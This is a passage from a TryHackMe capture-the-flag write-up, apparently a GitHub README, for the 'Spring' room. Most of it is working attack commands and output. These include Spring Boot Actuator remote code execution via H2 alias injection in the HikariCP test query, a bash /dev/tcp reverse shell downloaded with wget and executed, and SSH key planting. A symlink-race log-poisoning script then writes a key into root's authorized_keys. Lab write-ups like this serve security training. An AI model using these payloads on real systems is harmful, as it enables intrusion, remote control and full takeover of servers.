- server.ssl.key-store-password = DummyKeystorePassword123.
- server.ssl.keyStoreType = PKCS12<br>
- server.tomcat.remoteip.remote-ip-header = x-9ad42dea0356cb04<br>
- spring.security.user.name  =johnsmith<br>
- spring.security.user.password=◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦</p>

```bash
(venv) :~/Spring/sources/new/.git/src/main/resources$ cat application.properties
server.port=443
server.ssl.key-store=classpath:dummycert.p12
server.ssl.key-store-password=DummyKeystorePassword123.
server.ssl.keyStoreType=PKCS12
management.endpoints.enabled-by-default=true
management.endpoints.web.exposure.include=health,env,beans,shutdown,mappings,restart
management.endpoint.env.keys-to-sanitize=
server.forward-headers-strategy=native
server.tomcat.remoteip.remote-ip-header=x-9ad42dea0356cb04
server.error.whitelabel.enabled=false
spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration
server.servlet.register-default-servlet=true
spring.mvc.ignore-default-model-on-redirect=true
spring.security.user.name=johnsmith
spring.security.user.password=◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦◦
debug=false
spring.cloud.config.uri=
spring.cloud.config.allow-override=true
management.endpoint.heapdump.enabled=false
spring.resources.static-locations=classpath:/META-INF/resources/, classpath:/resources/, classpath:/static/, classpath:/public/
```

```bash
(venv) :~/Spring/sources/new/.git/src/main/resources$ curl http://spring.thm/ -H 'x-9ad42dea0356cb04: 172.16.0.21' -k -v
* Host spring.thm:80 was resolved.
* IPv6: (none)
* IPv4: xx.xx.xxx.xxx
*   Trying xx.xx.xxx.xxx:80...
* Connected to spring.thm (xx.xx.xxx.xxx) port 80
> GET / HTTP/1.1
> Host: spring.thm
> User-Agent: curl/8.5.0
> Accept: */*
> x-9ad42dea0356cb04: 172.16.0.21
>
< HTTP/1.1 302
< Cache-Control: private
< Expires: Thu, 01 Jan 1970 00:00:00 GMT
< Location: https://spring.thm/
< Content-Length: 0
< Date: Fri, 16 Jan 2026...
<
* Connection #0 to host spring.thm left intact
```

```bash
(venv) :~/Spring/sources/new/.git/src/main/resources$ curl -X POST -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' 'https://spring.thm/actuator/restart' -k
{"message":"Restarting"}
```

```bash
(venv) :~/Spring/data$ cat shell.sh
bash -i >& /dev/tcp/xxx.xxx.xxx.xx/4444 0>&1
```

```bash
:~/Spring/data$ sudo python3 -m http.server 80
...
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
(venv) ...:~/Spring/data$ curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\'java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'ping -c 5 xxx.xxx.xxx.xx\');\"}' "https://xx.xx.xxx.xxx/actuator/env" -k
{"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new','java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('ping -c 5 xxx.xxx.xxx.xx');"}(venv)
```

```bash
(venv) ...:~/Spring/data$ curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https:/xx.xx.xxx.xxx/actuator/restart" -k
{"message":"Restarting"}
```

```bash
(venv) ...:~/Spring/data$ curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'wget http://xxx.xxx.xxx.xx/shell.sh -O /tmp/shell.sh\');\"}' "https://xx.xx.xxx.xxx/actuator/env" -k
{"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('wget http://xxx.xxx.xxx.xx/shell.sh -O /tmp/shell.sh');"}(venv)
```

```bash
(venv) ...:~/Spring/data$ sudo python3 -m http.server 80
...
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
xx.xx.xxx.x - - [15/Jan/2026 xx:xx:xx] "GET /shell.sh HTTP/1.1" 200 -
```

```bash
(venv) c...:~/Spring/data$ curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https:/xx.xx.xxx.xxx/actuator/restart" -k
{"message":"Restarting"}
```

```bash
(venv) ...:~/Spring/data$ curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'chmod +x /tmp/shell.sh\');\"}' "https:///xx.xx.xxx.xxx/actuator/env" -k
{"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('chmod +x /tmp/shell.sh');"}
```

```bash
(venv) c...:~/Spring/data$ curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https:/xx.xx.xxx.xxx/actuator/restart" -k
{"message":"Restarting"}
```

```bash
:~/Spring/data$ curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'bash /tmp/shell.sh\');\"}' "https://xx.xx.xxx.xxx/actuator/env" -k
{"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('bash /tmp/shell.sh');"}
```

```bash
(venv) ...:~/Spring/data$ curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https:/xx.xx.xxx.xxx/actuator/restart" -k
{"message":"Restarting"}
```

<br>
<h1 align="center">Exploit: Spring Boot Actuator RCE via H2 HikariCP Injection : <a href="https://raw.githubusercontent.com/RosanaFSS/Cybersecurity-Journey-TryHackMe/refs/heads/CTFs-%26-Infos/Hard%20%F0%9F%9A%A9%20-%20Spring/Hard%20%F0%9F%9A%A9%20-%20Spring%20-%20ex.sh">ex.sh</a><a id='6'></a></h1>


```bash
:~/Spring$ bash ex.sh

                            Downloading shell.sh

[*]                              Injecting payload...
{"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('wget http://xxx.xxx.xxx.xx/shell.sh -O /tmp/shell.sh');"}
                            Payload Sent
[*] Triggering application restart...
{"message":"Restarting"}
                            Restart triggered. Waiting 15s for execution ...

                            chmod +x shell.sh

[*]                              Injecting payload...
{"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('chmod +x /tmp/shell.sh');"}
                            Payload Sent
[*] Triggering application restart...
{"message":"Restarting"}
                            Restart triggered. Waiting 15s for execution ...

                            Executing shell.sh

[!]                         GUarantee that your Listener is up in port 4444

[*]                              Injecting payload...
{"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('bash /tmp/shell.sh');"}
                            Payload Sent
[*] Triggering application restart...
{"message":"Restarting"}
                            Restart triggered. Waiting 15s for execution ...

[+]                         DONE.
```

<img width="1858" height="674" alt="image" src="https://github.com/user-attachments/assets/75737177-dafd-4437-94d5-54b8e04084c6" />

<br>
<br>
<br>

```bash
:~/Spring/data$ nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on xx.xx.xxx.xxx 58838
bash: cannot set terminal process group (1035): Inappropriate ioctl for device
bash: no job control in this shell
nobody@spring:/$ whoami
nobody
```

```bash
nobody@spring:/$ id
id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
```

```bash
nobody@spring:/$ pwd
pwd
/
```

```bash
nobody@spring:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
nobody@spring:/$ ^Z
[1]+  Stopped                 nc -nlvp 4444
```

```bash
...:~/Spring/data$ stty raw -echo; fg
nc -nlvp 4444
```

```bash
nobody@spring:/$ export TERM=xterm-256color
```

```bash
nobody@spring:/$ find / -name "foothold.txt" 2>/dev/null
/opt/foothold.txt
```

```bash
nobody@spring:/$ cat /opt/foothold.txt
THM{••••••••••••••••••••••••••••}
```

<img width="1336" height="186" alt="image" src="https://github.com/user-attachments/assets/6fa649d2-ea94-4311-afd6-4f84bfd67691" />

<br>
<br>
<br>
<p>1.1. <em>What's the flag in foothold.txt?</em><br>
<code>THM{••••••••••••••••••••••••••••}</code></p>
<br>
<br>

```bash
nobody@spring:/$ find / -name "user.txt" 2>/dev/null
/home/johnsmith/user.txt
```

```bash
nobody@spring:/$ su johnsmith
Password:
johnsmith@spring:/$
```

<img width="1333" height="203" alt="image" src="https://github.com/user-attachments/assets/73779e4e-5673-4df0-bae7-804d44468d2e" />

<br>
<br>
<br>

```bash
johnsmith@spring:/$ cd /home/johnsmith/
```

```bash
johnsmith@spring:~$ ls
tomcatlogs  user.txt
```

```bash
johnsmith@spring:~$ cat user.txt
THM{•••••••••••••••••••••••••••}
```

<img width="1327" height="292" alt="image" src="https://github.com/user-attachments/assets/cd84d2f3-01d1-47a4-a189-216a574c664f" />

<br>
<br>
<br>
<p>1.2. <em>What's the flag in user.txt?</em><br>
<code>THM{•••••••••••••••••••••••••••}</code></p>
<br>
<br>
<br>

```bash
johnsmith@spring:~$ ls -lah
total 44K
drwxr-xr-x 7 johnsmith johnsmith 4.0K Jul 10  2020 .
drwxr-xr-x 3 root      root      4.0K Jun 28  2020 ..
lrwxrwxrwx 1 johnsmith johnsmith    9 Jul 10  2020 .bash_history -> /dev/null
-rw-r--r-- 1 johnsmith johnsmith  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 johnsmith johnsmith 3.7K Apr  4  2018 .bashrc
drwx------ 2 johnsmith johnsmith 4.0K Jul 10  2020 .cache
drwx------ 3 johnsmith johnsmith 4.0K Jun 28  2020 .gnupg
drwxrwxr-x 3 johnsmith johnsmith 4.0K Jul 10  2020 .local
-rw-r--r-- 1 johnsmith johnsmith  807 Apr  4  2018 .profile
drwx------ 2 johnsmith johnsmith 4.0K Jul 10  2020 .ssh
drwxrwxr-x 2 johnsmith johnsmith 4.0K Jan 16 16:51 tomcatlogs
-r-------- 1 johnsmith johnsmith   34 Jul 10  2020 user.txt
```

```bash
:~/Spring$ ssh-keygen
...
+----[SHA256]-----+
```

```bash
:~/Spring$  ls
data  id_john  id_john.pub  sources
```

```bash
:~/Spring$ cat id_john.pub
ssh-rsa ssh-...
```

```bash
johnsmith@spring:~$ echo 'ssh-rsa ssh-...' > /home/johnsmith/.ssh/authorized_keys
```

```bash
johnsmith@spring:~/.ssh$ ls -lah
total 12K
drwx------ 2 johnsmith johnsmith 4.0K Jan 16 19:04 .
drwxr-xr-x 7 johnsmith johnsmith 4.0K Jul 10  2020 ..
-rw-rw-r-- 1 johnsmith johnsmith  108 Jan 16 19:04 authorized_keys
```
```bash
:~/Spring$ ssh -i id_john johnsmith@spring.thm
...
johnsmith@spring:~$
```

```bash
johnsmith@spring:~/tomcatlogs$ getent hosts
127.0.0.1       localhost
127.0.1.1       spring
127.0.0.1       ip6-localhost ip6-loopback
```

```bash
johnsmith@spring:~/tomcatlogs$ ps aux | grep spring
johnsmi+  7856  0.0  0.1  13136  1000 pts/1    S+   19:24   0:00 grep --color=auto spring
```

```bash
johnsmith@spring:~/tomcatlogs$ ps aux | grep root
johnsmi+  7860  0.0  0.1  13136  1056 pts/1    S+   19:26   0:00 grep --color=auto root
```

```bash
johnsmith@spring:~$ cat /etc/systemd/system/spring.service
[Unit]
Description=Spring Boot Application
After=syslog.target
StartLimitIntervalSec=0

[Service]
User=root
Restart=always
RestartSec=1
ExecStart=/root/start_tomcat.sh

[Install]
WantedBy=multi-user.target
```

```bash
johnsmith@spring:~$ systemctl status spring
● spring.service - Spring Boot Application
   Loaded: loaded (/etc/systemd/system/spring.service; enabled; vendor preset: enabled)
   Active: active (running) since Fri 2026-01-16 ...; 2h 18min ago
 Main PID: 853
    Tasks: 3 (limit: 1079)
   CGroup: /system.slice/spring.service
           ├─853 /bin/bash /root/start_tomcat.sh
           ├─922 sudo su nobody -s /bin/bash -c /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java -Djava.security.egd=file:///dev/urandom -jar /opt/spring/sources/new/spring-0.0.1-SNAPS
           └─924 tee /home/johnsmith/tomcatlogs/1768582278.log

Warning: Journal has been rotated since unit was started. Log output is incomplete or unavailable.
lines 1-11/11 (END)
```

```bash
johnsmith@spring:/$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/nul
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 43088 Mar  5  2020 /bin/mount
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 26696 Mar  5  2020 /bin/umount
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 149080 Jan 31  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 root root 109432 Oct 30  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 40152 Jan 27  2020 /snap/core/9436/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/9436/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/9436/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/9436/bin/su
-rwsr-xr-x 1 root root 27608 Jan 27  2020 /snap/core/9436/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/9436/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/9436/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/9436/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/9436/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/9436/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jan 31  2020 /snap/core/9436/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Nov 29  2019 /snap/core/9436/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/9436/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 110792 Jun  5  2020 /snap/core/9436/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Feb 11  2020 /snap/core/9436/usr/sbin/pppd
-rwsr-xr-x 1 root root 40152 Oct 10  2019 /snap/core/8268/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/8268/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/8268/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/8268/bin/su
-rwsr-xr-x 1 root root 27608 Oct 10  2019 /snap/core/8268/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/8268/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/8268/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/8268/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/8268/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Oct 11  2019 /snap/core/8268/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 106696 Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/8268/usr/sbin/pppd
```

```bash
johnsmith@spring:~$ cd tomcatlogs/pwd/
/home/johnsmith/tomcatlogs
```

```bash
johnsmith@spring:~/tomcatlogs$ ls
1594410148.log  1594410465.log  1594413491.log  1594552377.log  1594574751.log  1594575333.log  1594576008.log  1594584453.log  1768582278.log
```

```bash
johnsmith@spring:~/tomcatlogs$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
johnsmi+  7051  0.0  0.3  21272  3684 pts/0    S+   18:58   0:00 bash
johnsmi+  7084  0.0  0.7  76692  6968 ?        Ss   19:07   0:00 /lib/systemd/systemd --user
johnsmi+  7222  0.0  0.5  21460  5160 pts/1    Ss   19:08   0:00 -bash
johnsmi+  7882  0.0  0.3  36076  3364 pts/1    R+   19:31   0:00 ps aux
```


<br>
<h1 align="center">Exploit: Root LPE via Symlink Race Condition and Log Poisoning : <a href="https://raw.githubusercontent.com/RosanaFSS/Cybersecurity-Journey-TryHackMe/refs/heads/CTFs-%26-Infos/Hard%20%F0%9F%9A%A9%20-%20Spring/Hard%20%F0%9F%9A%A9%20-%20Spring%20-%20get.sh">get.sh</a><a id='7'></a></h1>

```bash
johnsmith@spring:~/tomcatlogs$ nano get.sh
```

```bash
#!/bin/bash

pubkey=$(cat key.pub)

curl -X POST https://localhost/actuator/shutdown -H 'x-9ad42dea0356cb04: 172.16.0.21' -k

d=$(date '+%s')

for i in {1..30}
do
 let time=$(( d + i ))
 ln -s /root/.ssh/authorized_keys "$time.log"
done

sleep 30s

curl --data-urlencode "name=$pubkey" https://localhost/ -k
sleep 5s

ssh  -o "StrictHostKeyChecking=no" -i ./key root@localhost
```


```bash
johnsmith@spring:~/tomcatlogs$ bash get.sh
{"message":"Shutting down, bye..."}
whoami
Hello,ssh-... johnsmith@spring!
whoami
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jan 16 ... 2026

  System load:  1.02               Processes:           107
  Usage of /:   11.7% of 58.80GB   Users logged in:     1
  Memory usage: 36%                IP address for ens5: ...
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

9 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


root@spring:~#
```

```bash
root@spring:~# whoami
root
```

```bash
root@spring:~# pwd
/root
```

```bash
root@spring:~# ls
root.txt  start_tomcat.sh
```

```bash
root@spring:~# cat root.txt
THM{•••••••••••••••••••••••••••}
```

<img width="1479" height="668" alt="image" src="https://github.com/user-attachments/assets/991ce974-b3a4-4bcb-be83-1daa89043cbe" />

<br>
<br>
<br>
<p>1.3. <em>What's the flag in root.txt?</em><br>
<code>THM{•••••••••••••••••••••••••••}</code></p>

<br>
<br>
<br>
<h1 align="center">Challenge Completed</h1>


<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/dd785c18-5e60-4ddf-9c5c-2d0c4e505fe4"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/28eb67db-345f-48ab-b2b9-4d4ee9db87f9"></p>


<h1 align="center">My TryHackMe Journey ・ 2026, January</h1>

<div align="center"><h6>

| Date<br><br>   | Room <br><br> |Streak<br><br>   |Global<br>All Time|Brazil<br>All Time|Global<br>Monthly|Brazil<br>Monthly|Points<br><br>|Rooms<br>Completed|Badges<br><br>|
|:------:|:--------------------------------------|:--------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|:------------:|
|16     |Hard 🚩 - Spring                      |15 |     87ᵗʰ  |     3ʳᵈ    |      540ᵗʰ   |        4ᵗʰ     |    138,942  |    1,066    |    87     |
|14     |Insane 🚩 - Scheme Catcher            |13 |     87ᵗʰ  |     3ʳᵈ    |      534ᵗʰ   |        5ᵗʰ     |    138,822  |    1,065    |    87     |
|13     |Hard 🚩 - Breachblocker Unlocker      |12 |     86ᵗʰ  |     3ʳᵈ    |      526ᵗʰ   |        5ᵗʰ     |    138,732  |    1,064    |    87     |
|11     |Medium 🚩 - Azure: Eyes Wide Shut     |10 |     86ᵗʰ  |     3ʳᵈ    |      558ᵗʰ   |        5ᵗʰ     |    138,450  |    1,063    |    86     |
|8      |Medium ⚙️ - Phishing Unfolding        | 7 |     86ᵗʰ  |     3ʳᵈ    |      508ᵗʰ   |        4ᵗʰ     |    138,372  |    1,062    |    84     |
|8      |Easy ⚙️ - Introduction to Phishing    | 7 |     96ᵗʰ  |     3ʳᵈ    |    2,479ᵗʰ   |       32ⁿᵈ     |    137,117  |    1,062    |    84     |
|8      |Medium 🔗 - KaffeeSec - SoMeSINT      | 7 |     98ᵗʰ  |     3ʳᵈ    |    2,847ᵗʰ   |       38ᵗʰ     |    137,052  |    1,062    |    84     |
|7      |Hard 🚩 - Hack Back                   | 6 |     98ᵗʰ  |     3ʳᵈ    |    2,798ᵗʰ   |       37ᵗʰ     |    136,908  |    1,061    |    84     |
|7      |Hard 🚩 - Dead End?                   | 6 |     99ᵗʰ  |     3ʳᵈ    |    2,924ᵗʰ   |       37ᵗʰ     |    136,788  |    1,060    |    84     |
|6      |Easy 🔗 - Linux Strength Training     | 5 |     98ᵗʰ  |     3ʳᵈ    |    3,172ⁿᵈ   |       47ᵗʰ     |    136,608  |    1,059    |    84     |
|4      |Medium 🚩 - JVM Reverse Engineering   | 3 |     96ᵗʰ  |     3ʳᵈ    |    3,031ˢᵗ   |       46ᵗʰ     |    136,450  |    1,058    |    84     |
|3      |Medium 🚩 - Carrotbane of My Existence| 2 |     96ᵗʰ  |     3ʳᵈ    |    3,468ᵗʰ   |       49ᵗʰ     |    136,150  |    1,057    |    84     |
|2      |Easy 🔗 - Learn Rust                  | 1 |     96ᵗʰ  |     3ʳᵈ    |    5,152ⁿᵈ   |       67ᵗʰ     |    136,030  |    1,056    |    84     |


</h6></div><br>


<p align="center">Global All Time:    87ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/3fd795ed-f933-4e76-812a-7c55862c1713"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/b8e78640-e780-4254-a38d-241787bdd692"><br><br>
                  Brazil All Time:      3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/a4c52b58-8fe5-48d3-aa5e-03fc1fcc7498"><br><br>
                  Global monthly:     540ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/84e1a1c9-7d54-445e-a174-70b57db6dd09"><br><br>
                  Brazil monthly:       4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/75ca885d-4f1b-4bf9-a215-4a675d7a32da"></p>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p
